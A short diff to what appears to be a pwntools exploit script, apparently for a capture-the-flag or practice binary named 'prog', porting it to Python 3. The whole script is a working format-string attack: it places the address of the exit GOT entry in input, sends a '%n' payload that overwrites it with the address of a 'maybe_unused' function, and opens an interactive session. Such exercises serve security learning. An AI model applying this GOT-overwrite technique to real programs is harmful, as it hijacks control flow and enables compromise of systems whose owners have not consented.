@@ -1,16 +1,16 @@
 from pwn import *
 
-e = ELF('prog')
-context.clear(arch=e.arch, endian=e.endian)
+context.binary = 'prog'
+e = context.binary
 
 p = e.process()
-p.sendline('a'*4+pack(e.got.exit))
+p.sendline(b'a'*4+pack(e.got.exit))
 
 where = 7
 many = e.sym.format - e.sym.input
-p.sendline('a'*many + '%1${}d%{}$n&&ok'.format(e.sym.maybe_unused, where))
+p.sendline(b'a'*many + '%1${}d%{}$n&&ok'.format(e.sym.maybe_unused, where).encode('ascii'))
 
-print(p.recvuntil('&&'))
+print(p.recvuntil(b'&&'))
 
 p.clean()
 p.interactive()
